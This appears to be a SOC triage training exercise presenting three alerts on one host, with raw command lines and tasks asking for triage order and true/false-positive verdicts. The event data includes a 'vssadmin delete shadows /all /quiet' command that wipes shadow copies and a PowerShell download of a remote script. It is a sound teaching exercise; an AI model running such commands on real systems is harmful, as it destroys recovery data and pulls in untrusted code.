# Case 010 — Phase 2 Batch: 3 Concurrent Alerts

**Incident ID:** IR-2026-026
**Date Detected:** 2026-07-04
**Host:** JIMIL-JOSHI
**Reported By:** SOC Monitoring (Splunk Alert)
**Status:** 🔴 Open — Pending Triage

**Phase:** 2 — Mixed batch triage.

---

## 🎫 Alert Summary — Batch of 3

| Alert | Type | SIEM-Assigned Severity |
|---|---|---|
| Alert D | whoami after RDP logon | 🟡 Low |
| Alert E | vssadmin delete shadows | 🔴 High |
| Alert F | Invoke-WebRequest to GitHub raw URL | 🟠 Medium |

---

## 📄 Raw Event Data

### Alert D
```
Process_Command_Line: whoami
Account: hp | Parent: cmd.exe | Logon_Type: 10 (RemoteInteractive / RDP)
```

### Alert E
```
Process_Command_Line: vssadmin delete shadows /all /quiet
Account: hp | Parent: cmd.exe
```

### Alert F
```
Process_Command_Line: powershell.exe -c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/testuser/repo/main/tool.ps1 -OutFile tool.ps1"
Account: hp | Parent: cmd.exe
```

---

## 🎯 Task

1. Determine triage order across all 3 alerts and justify it.
2. Investigate each alert independently.
3. Give a verdict (TP/FP/Ambiguous) for each with justification.
4. For Alert D specifically: does the RDP logon context change how `whoami` should be interpreted compared to a local session?
